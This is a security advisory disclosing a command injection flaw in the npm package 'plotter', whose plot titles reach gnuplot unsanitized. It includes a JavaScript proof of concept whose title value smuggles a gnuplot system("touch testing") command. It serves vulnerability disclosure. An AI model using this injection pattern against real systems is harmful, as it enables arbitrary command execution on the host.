  Command Injection in plotter
  All versions of `plotter` are vulnerable to Command Injection. The package fails to sanitize plot titles, which may allow attackers to execute arbitrary code in the system if the title value is supplied by a user. The following proof-of-concept creates a `testing` file in the current directory:

  ```
  var plot = require('plotter').plot;

  const title = 'Example "\nset title system("touch testing")#';

  plot({
  data: [ 3, 1, 2, 3, 4 ],
  filename: 'output.pdf',
  style: 'linespoints',
  title: title,
  logscale: true,
  xlabel: 'time',
  ylabel: 'length of string',
  format: 'pdf'
  });

  ```


  ## Recommendation

  No fix is currently available. Consider using an alternative package until a fix is made available.
